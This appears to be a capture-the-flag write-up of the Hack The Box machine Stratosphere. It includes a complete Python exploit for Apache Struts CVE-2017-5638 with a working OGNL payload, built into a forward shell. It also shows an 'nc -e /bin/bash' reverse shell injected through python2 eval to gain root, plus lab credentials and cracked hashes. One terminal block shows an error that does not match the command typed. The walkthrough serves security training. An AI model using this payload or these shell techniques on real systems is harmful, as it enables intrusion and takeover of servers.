---
title: HTB: Stratosphere
url: https://0xdf.gitlab.io/2018/09/01/htb-stratosphere.html
date: 2018-09-01T15:47:21+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-stratosphere, hackthebox, python, struts, cve-2017-9805, cve-2017-5638, mkfifo-shell, forward-shell
---

Stratosphere is a super fun box, with an Apache Struts vulnerability that we can exploit to get single command execution, but not a legit full shell. I’ll use the Ippsec mkfifo pipe method to write my own shell. Then there’s a python script that looks like it will give us the root flag if we only crack some hashes. However, we actually have to exploit the script, to get a root shell.

## Box Info

| Name | [Stratosphere](https://hackthebox.com/machines/stratosphere)  [Stratosphere](https://hackthebox.com/machines/stratosphere) [Play on HackTheBox](https://hackthebox.com/machines/stratosphere) |
| --- | --- |
| Release Date | 03 Mar 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Stratosphere |
| Radar Graph | Radar chart for Stratosphere |
| First Blood User | 03:09:30[Booj Booj](https://app.hackthebox.com/users/809) |
| First Blood Root | 04:05:33[Booj Booj](https://app.hackthebox.com/users/809) |
| Creator | [linted linted](https://app.hackthebox.com/users/8491) |

## nmap

nmap shows ssh, web (80), and http-proxy running on 8080:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.64
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-01 09:48 EDT
Nmap scan report for 10.10.10.64
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds

```

## web - port 80

### Site

Site is for credit protection:
![](https://0xdfimages.gitlab.io/img/stratosphere-web80-root.png)

The only link on the site returns a “under construction” message:

```

root@kali# curl http://10.10.10.64/GettingStarted.html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <title>Stratosphere -- Getting Started</title>
</head>
<body>
    <h1>Site under construction. Please check back later.</h1>
</body>
</html>

```

Visiting a page that doesn’t exist returns a page that tells us it’s Apache Tomcat 8.5.14 (Debian):

```

root@kali# curl http://10.10.10.64/sdafasdf
<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> /sdafasdf</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/8.5.14 (Debian)</h3></body></html>

```

### gobuster

Run gobuster to look for additional paths:

```

root@kali# gobuster -u http://10.10.10.64 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.64/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 307,200,204,301,302
[+] Extensions   : .txt,.php,.html
=====================================================
/index.html (Status: 200)
/manager (Status: 302)
/GettingStarted.html (Status: 200)
/Monitoring (Status: 302)

```

### /manager

`/manager` is the default Tomcat path for managing the application. It asks for http basic auth, and none of my immediate guesses got me in.

### /Monitoring

`/Monitoring` returns a 302 which takes us to `http://10.10.10.64/Monitoring/example/Welcome.action`:
![](https://0xdfimages.gitlab.io/img/stratosphere-web80-monitoring-root.png)

The register button goes to `http://10.10.10.64/Monitoring/example/Register.action`, which returns another under construction message.

The sign on button goes to `http://10.10.10.64/Monitoring/example/Login_input.action`, which returns a login page:
![](https://0xdfimages.gitlab.io/img/stratosphere-web80-monitoring-login.png)

There’s also a hello world app at `http://10.10.10.64/Monitoring/example/HelloWorld.action` that doesn’t seem to do much:
![](https://0xdfimages.gitlab.io/img/stratosphere-web80-monitoring-helloworld.png)

## Apache Struts - RCE

At this point we have a ton of hints to look at Struts:
- All the paths in the Monitoring example application end with .action. That is a very meaningful word in the Apache Struts framework. Here’s an overview (taken from [here](https://netbeans.org/kb/docs/web/quickstart-webapps-struts.html)):
  ![](https://0xdfimages.gitlab.io/img/stratosphere-struts.png)
- This is a credit monitoring service, which is a clear nod to Equifax, who was breached and lost personal data on over 140 million people in 2017 ([ref](https://www.synopsis.com/blogs/software-security/equifax-apache-struts-cve-2017-5638-vulnerability/), though if this is news to you, I’m not sure what to recommend…)

There were a bunch of high profile vulnerabilities in Struts recently, several of which provide RCE:
https://www.cvedetails.com/vulnerability-list/vendor\_id-45/product\_id-6117/Apache-Struts.html

### CVE-2017-9805 - fail

Sans Holiday Hack 2017 required exploiting CVE-2017-9805 to gain a foothold. Using the [script by Chris Davis](https://github.com/chrisjd20/cve-2017-9805.py/blob/master/cve-2017-9805.py) on Stratosphere didn’t seem to succeed. This exploit doesn’t return results, so the user has to look for ways to get information back. In HH, I did that by having the target server curl back to me with command results in the url. That technique didn’t work here, which could indicate the server isn’t vulnerable, or that they are filtering outbound connections.

### CVE-2017-5638

The highest rated vulnerabilities on the cvedetails list was CVE-2017-5638, which has a 10. It’s also one said to have been used on Equifax. There’s a [POC python script on the metasploit github](https://github.com/rapid7/metasploit-framework/issues/8064).

```

root@kali# python cve-2017-5638.py http://10.10.10.64/Monitoring/example/Welcome.action "ls -l"
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: ls -l

total 16
lrwxrwxrwx 1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r-- 1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x 2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx 1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x 2 root    root    4096 May  2 04:46 policy
drwxrwxr-x 4 tomcat8 tomcat8 4096 Feb 10 21:12 webapps
lrwxrwxrwx 1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8

root@kali# python cve-2017-5638.py http://10.10.10.64/Monitoring/example/Welcome.action "id"
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: id

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

```

w00t! Code execution.

## Local Enumeration

At this point, we’d like to get a better shell, and we’d like to get a user with more privilege. Here’s what we can find:
- Low priv user, tomcat8, can’t access a lot
- There is a home dir for richard
- In `/etc/tomcat8/tomcat-users/xml`, there’s a username and password:
  - `<user username="teampwner" password="cd@6sY{f^+kZV8J!+o*t|<fpNy]F_(Y$" roles="manager-gui,admin-gui" />`
  - those creds don’t seem to work on the `/manager` path as expected
- Outbound traffic is heavily filtered - not able to `wget` or `nc` to attacker box
- `ifconfig`, `netstat`, `curl` not on host –> maybe container? just stripped down?
- more creds in local dir, `/var/lib/tomcat8/db_connect`:

  ```

    [ssn]
    user=ssn_admin
    pass=AWs64@on*&
      
    [users]
    user=admin
    pass=admin

  ```
- `/proc/net/arp` shows other hosts:

  ```

    stratosphere> cat /proc/net/arp
    IP address       HW type     Flags       HW address            Mask     Device
    10.10.10.68      0x1         0x2         00:50:56:b9:42:09     *        ens33
    10.10.10.2       0x1         0x2         00:50:56:aa:9c:8d     *        ens33
    10.10.10.65      0x1         0x2         00:50:56:b9:a5:6c     *        ens33

  ```
- `/proc/net/fib_trie` shows ip of 10.10.10.64 and localhost
- `/proc/net/tcp` shows 6 listening ports:

  ```

    stratosphere> cat /proc/net/tcp | grep " 0A "
    0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 14425 1 ffff99e33b7167c0 100 0 0 10 0
    1: 00000000:3039 00000000:0000 0A 00000000:00000000 00:00000000 00000000   115        0 777046 1 ffff99e2fbcc1800 100 0 0 10 0
    2: 0100007F:1F45 00000000:0000 0A 00000000:00000000 00:00000000 00000000   115        0 16524 1 ffff99e33c0447c0 100 0 0 10 0
    3: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   116        0 15012 1 ffff99e33b716040 100 0 0 10 0
    4: 00000000:1770 00000000:0000 0A 00000000:00000000 00:00000000 00000000   115        0 695276 1 ffff99e2fd3b1800 100 0 0 10 0
    5: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000   115        0 16493 1 ffff99e33ac1a080 100 0 0 10 0
    6: 00000000:04D2 00000000:0000 0A 00000000:00000000 00:00000000 00000000   115        0 294304 1 ffff99e2ee2537c0 100 0 0 10 0

  ```
  - Interesting because the original nmap showed 22, 80, and 8080. That result above shows the following ports listening:
    1. 0.0.0.0:22
    2. 0.0.0.0:12345
    3. 127.0.0.1:8005
    4. 127.0.0.1:3306
    5. 0.0.0.0:6000
    6. 0.0.0.0:8080
    7. 0.0.0.0:1234

## Building a Shell

To solidify our shell, we’ll make use of mkfifo method from IppSec’s [Sokar video](https://www.youtube.com/watch?v=k6ri-LFWEj4). (You may have already noticed my `stratophere>` shell above.)

### Script

`stratosphere_shell.py` uses the [poc struts exploit](https://github.com/rapid7/metasploit-framework/issues/8064) to run commands. It starts by making two pipes with `mkfifo`, one called stdin and one called stdout. Then it tails stdin into a bash process who’s output goes into stdout. Because of how tail works, that bash process will stay open. So if we can write something to stdin, it will be passed to the running bash process, and the results written to the stdout pipe. We’ll use struts executions to write to the stdin pipe, and then another thread will be constantly using the struts exploit to read from the stdout pipe.

Here’s the full code:

```

#!/usr/bin/python3
# -*- coding: utf-8 -*-

# source: https://github.com/rapid7/metasploit-framework/issues/8064

import base64
#import httplib
import random
import requests
import threading
import time
#import urllib2

class Stratosphere(object):

    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
        self.url = r"http://10.10.10.64/Monitoring/example/Welcome.action"
        self.proxies = {'http' : proxies}
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = interval

        # set up shell
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"""mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"""
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    def ReadThread(self):
        GetOutput = f"""/bin/cat {self.stdout}"""
        while True:
            result = self.RunRawCmd(GetOutput) #, proxy=None)
            if result:
                print(result)
                ClearOutput = f"""echo -n "" > {self.stdout}"""
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)

    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += f"(#cmd='{cmd}')."
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"

        if proxy:
            proxies = self.proxies
        else:
            proxies = {}

        headers = {'User=Agent': 'Mozilla/5.0', 'Content-Type': payload}
        try:
            r = requests.get(self.url, headers=headers, proxies=proxies, timeout=timeout)
            return r.text
        except:
            pass

    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode(f'{cmd.rstrip()}\n'.encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
        self.WriteCmd(UpgradeShell)

prompt = "stratosphere> "
S = Stratosphere()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)

```

### Successful Shell

That gives a nice stateful shell:

```

root@kali# python3 ./stratosphere_shell.py
[*] Session ID: 17370
[*] Setting up fifo shell on target
[*] Setting up read thread
stratosphere> pwd
/var/lib/tomcat8

stratosphere>

ls
conf
db_connect
lib
logs
policy
webapps
work

stratosphere> cd ..
stratosphere> pwd
/var/lib

stratosphere> upgrade
tomcat8@stratosphere:/var/lib$
/var/lib
tomcat8@stratosphere:/var/lib$

```

## Privesc: tomcat8 –> richard

### MiriaDB Database

We could have done this without the shell, but it was fun to build, and made enumeration much easier.

Using new shell, connect to the database observed on 3306 with creds we found in the file above:

```

root@kali# python3 ./stratosphere_shell.py
Session: 36734
[*] Setting up fifo shell on target
[*] Setting up read thread
stratosphere> upgrade
tomcat8@stratosphere:~$
pwd
/var/lib/tomcat8
tomcat8@stratosphere:~$
ls -l
total 16
lrwxrwxrwx 1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r-- 1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x 2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx 1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x 2 root    root    4096 May  2 11:58 policy
drwxrwxr-x 4 tomcat8 tomcat8 4096 Feb 10 21:12 webapps
lrwxrwxrwx 1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8
tomcat8@stratosphere:~$
cat db_connect
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
tomcat8@stratosphere:~$
mysql -u admin -p
mysql -u admin -p
Enter password:
admin

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 67
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| users              |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed

MariaDB [users]>
show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| accounts        |
+-----------------+
1 row in set (0.00 sec)

MariaDB [users]>
select * from accounts;
+------------------+---------------------------+----------+
| fullName         | password                  | username |
+------------------+---------------------------+----------+
| Richard F. Smith | 9tc*rhKuG5TyXvUJOrE^5CK7k | richard  |
+------------------+---------------------------+----------+
1 row in set (0.01 sec)

```

### su with Creds

With password in hand, try su:

```

tomcat8@stratosphere:~$
su richard
Password:
9tc*rhKuG5TyXvUJOrE^5CK7k

richard@stratosphere:/var/lib/tomcat8$

```

### user.txt

Use access as richard to get user.txt:

```

richard@stratosphere:/var/lib/tomcat8$ cd /home/richard

richard@stratosphere:~$
cat user.txt
e610b298************************
richard@stratosphere:~$
wc -c user.txt
33 user.txt

```

## Privesc: richard –> root

### SSH Access

With richard’s creds, we can actually ssh in, so even more stable.

### test.py

In richard’s home dir, in addition to user.txt, there’s a python script, test.py:

```

richard@stratosphere:~$ ls -l
total 12
drwxr-xr-x 2 richard richard 4096 Oct 18  2017 Desktop
-rwxr-x--- 1 root    richard 1507 Mar 19 15:23 test.py
-r-------- 1 richard richard   33 Feb 27 16:31 user.txt

richard@stratosphere:~$ cat test.py
#!/usr/bin/python3
import hashlib

def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()

```

sudo permissions show that we can run this as root:

```

richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py

```

#### Solve the Puzzles

This feels too easy, but let’s crack the hashes:

```

root@kali:/opt/JohnTheRipper# run/john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt ~/hackthebox/stratosphere-10.10.10.64/test.md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
kaybboo!         (?)
1g 0:00:00:00 DONE (2018-05-03 06:19) 2.222g/s 14860Kp/s 14860Kc/s 14860KC/s kaybear3..kayataui
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali:/opt/JohnTheRipper# run/john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt
~/hackthebox/stratosphere-10.10.10.64/test.sh1
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
ninjaabisshinobi (?)
1g 0:00:00:00 DONE (2018-05-03 06:23) 2.325g/s 11777Kp/s 11777Kc/s 11777KC/s ninjaako2..ninjaabisshinobi
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali:/opt/JohnTheRipper# run/john --format=raw-md4 --wordlist=/usr/share/wordlists/rockyou.txt ~/hackthebox/stratosphere-10.10.10.64/test.md4
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD4 [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
legend72         (?)
1g 0:00:00:00 DONE (2018-05-03 06:24) 3.125g/s 19638Kp/s 19638Kc/s 19638KC/s legend74..legend612
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali:/opt/JohnTheRipper# run/john --format=Raw-Blake2 --wordlist=/usr/share/wordlists/rockyou.txt ~/hackthebox/stratosphere-10.10.10.64/test.blake
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-Blake2 [BLAKE2b 512 128/128 AVX])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Fhero6610        (?)
1g 0:00:00:03 DONE (2018-05-03 06:25) 0.3311g/s 3698Kp/s 3698Kc/s 3698KC/s Fhero6610
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

And run the test:

```

richard@stratosphere:~$ sudo /usr/bin/python /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
kaybboo!
You got it!
Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff
ninjaabisshinobi
WOW, you're really good at this!
How about this? 91ae5fc9ecbca9d346225063f23d2bd9
legend72
OK, OK! I get it. You know how to crack hashes...
Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943
Fhero6610
sh: 1: /root/success.py: not found

```

#### Exploit test.py

Well that failed. There is a wildcard in the sudo string. Look at the python’s available:

```

richard@stratosphere:~$ ls -l /usr/bin/python*
lrwxrwxrwx 1 root root      16 Feb 11 19:46 /usr/bin/python -> /usr/bin/python3
lrwxrwxrwx 1 root root       9 Jan 24  2017 /usr/bin/python2 -> python2.7
-rwxr-xr-x 1 root root 3779512 Nov 24 12:33 /usr/bin/python2.7
lrwxrwxrwx 1 root root       9 Jan 20  2017 /usr/bin/python3 -> python3.5
-rwxr-xr-x 2 root root 4747120 Jan 19  2017 /usr/bin/python3.5
-rwxr-xr-x 2 root root 4747120 Jan 19  2017 /usr/bin/python3.5m
lrwxrwxrwx 1 root root      10 Jan 20  2017 /usr/bin/python3m -> python3.5m

```

It is unusual to see python mapped to python3 by default. Let’s think about functions that are different in python2 and python3, like `input`. This script intends to be called with python3, both in the #! and in the default mapping. And it makes use of `input` to get user input. But in python2, `input` is equivalent to `eval(raw_input(prompt))` ([ref](https://docs.python.org/2/library/functions.html#input)). So the user can pass something into this function that will be passed to `eval`.

[This article](https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html) on eval exploitation shows how an attacker can import modules and call them inside eval. To test it on stratosphere:

```

richard@stratosphere:~$ ls /dev/shm
output.17370

richard@stratosphere:~$ sudo python2 ~/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__("os").system("touch /dev/shm/0xdf")
Traceback (most recent call last):
  File "/home/richard/test.py", line 38, in <module>
    question()
  File "/home/richard/test.py", line 8, in question
    md5.update(q1.encode())
AttributeError: 'int' object has no attribute 'encode'

richard@stratosphere:~$ ls /dev/shm
0xdf  output.17370

```

Now get a shell:

```

richard@stratosphere:~$ sudo python2 ~/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__("os").system("nc -e /bin/bash 127.0.0.1 12311")
  File "<string>", line 1
    import pty.pty.spawn("bash")
                        ^
SyntaxError: invalid syntax

```

```

richard@stratosphere:~$ nc -lnvp  12311
listening on [any] 12311 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42910
id
uid=0(root) gid=0(root) groups=0(root)
python -c 'import pty;pty.spawn("bash")'
root@stratosphere:/home/richard#

```

### root.txt

With a root shell, grabbing the flag is easy:

```

root@stratosphere:~# pwd
/root

root@stratosphere:~# wc -c root.txt
33 root.txt

root@stratosphere:~# cat root.txt
d41d8cd9...

```